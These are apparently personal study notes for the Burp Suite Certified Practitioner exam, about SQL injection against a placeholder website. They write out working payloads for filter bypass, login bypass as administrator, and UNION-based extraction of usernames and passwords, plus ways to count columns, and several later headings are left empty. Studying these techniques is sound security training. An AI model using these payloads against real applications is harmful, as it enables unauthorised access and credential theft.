# BSCP

These are my notes for BSCP.  Burpsuite Certified Professional.

Reference Sheet
SQL Injection Payload List
    https://github.com/payloadbox/sql-injection-payload-list
SQLi Cheat Sheet


SQLi Examples
-----------------
    Retrieving hidden data
        Application displays choices of differing categories from a table. When selecting a choice the browser requests the following URL:
            https://insecure-website.com/products?category=Gifts
        Application performs SQL query
            SELECT * FROM products WHERE category = 'Gifts' AND released = 1
        This query retrieves the following from the database
            all details(*), from the products table, where the category is gifts, and released is 1
                released = 1 is interesting what is released = 0?
        To test
            https://insecure-website.com/products?category=Gifts'--
                which will perform this query
                    SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
                    The -- is a comment indicator for SQL, which interprets the rest of the query as a comment or effectively removes "AND released = 1" and should display anything in the field of "released" maybe "unreleased"?
        To enumerate further unknown categories
            https://insecure-website.com/products?category=Gifts'+OR+1=1--
                resulting in this query
                    SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
        Take note when injecting a condition "OR 1 = 1", applications commonly use data from the request in mulitple queries, if UPDATE or DELETE statement is reached by your condition data can go poof
 -----------------   
    Subverting Application Logic
        a login application with username and password, checks credentials with SQL by performing this query
            SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
        if this returns the user details, then login succeeds, else it fails
            can we attempt "administrator'--  to comment out the password part of the query?
                SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
 ----------------
    Retrieving data from other database tablles
        If the results of an SQL query are within the applications response, we use SQLi to retrieve data from other tables within the databsae with the UNION and execute an additional SELECT
        ex: with this query
            SELECT name, description FROM products WHERE category = 'Gifts'
        we can alter it by submitting:
            ' UNION SELECT username, password FROM users--
        which should return all usernames and passwords
UNION ATTACKS
    SELECT a, b FROM table1 UNION SELECT c, d FROM table2
        this will return a single result with two columns 'a and b' within table 1 and 'c and d' within table 2
    UNION requires
        individual queries == number of columns
        data types in each column are compatible
    To perform we then enumerate:
        how many columns are being returned from originating query
        which have suitable data types
    How to determine the number of columns for SQLi UNION attacks
        two methods
            A. injecting a series of "ORDER BY" (assumed injection point is the "WHERE" clause of original query)
                ' ORDER BY 1--
                ' ORDER BY 2--
                ' ORDER BY 3--
                """UNTIL ERROR""" this may be within the HTTP response or a generic error, or no results, must infer the
            B. Submit a series of "UNION SELECT" payloads with differing null values:
                ' UNION SELECT NULL--
                ' UNION SELECT NULL,NULL--
                ' UNION SELECT NULL,NULL,NULL--
                """Until error is achieved""" might be NullPointerException


    Examining the database
        





    Blind SQL Injection Vulnerabilities

    Conditionally trigger time delay in query processing

    Detecting SQLi vulnerabilities

    SQLi in different parts of the query

    Second Order SQLi

    Preventing SQLi

